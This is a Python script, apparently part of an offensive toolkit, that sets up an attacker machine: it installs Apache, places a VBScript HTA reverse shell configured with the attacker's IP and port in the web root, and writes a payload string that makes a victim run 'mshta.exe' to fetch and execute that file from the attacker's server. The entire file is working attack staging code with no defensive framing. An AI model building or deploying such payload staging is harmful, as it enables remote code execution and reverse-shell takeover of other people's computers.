#!/usr/bin/env python

# Run on Linux attacker box to set up payload and Apache HTTP server to host the HTA reverse shell.

import os
import argparse


def config(ip, port, httpport):
    apache_dir = '//var//www//html//'

    if not os.path.isdir(apache_dir):
        print('Installing Apache server')
        os.system('sudo apt-get -y install apache2')

    with open('reverse_shell//shell.hta', 'r') as f:
        shell = f.read()
        confshell = '<script language="VBScript">' + '\n\nIP = "' + ip + '"\nport = "' + port + '"' + shell
        with open(os.path.join(apache_dir, 'shell.hta'), 'w') as f2:
            f2.write(confshell)

    with open('payload.py','w') as f:
        f.write('system_arg = b\'mshta.exe http://' + ip + ':' + httpport +'/shell.hta\' + b\'\\x00\\x00\'')


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-ip', help='ip address of evil DNS + HTTP server', required=True)
    parser.add_argument('-p', '--port',  help='reverse shell port', required=True)
    parser.add_argument('-hp', '--httpport',  help='port for HTTP server', default='80', required=False)
    args = parser.parse_args()

    config(args.ip, args.port, args.httpport)


if __name__ == '__main__':
    main()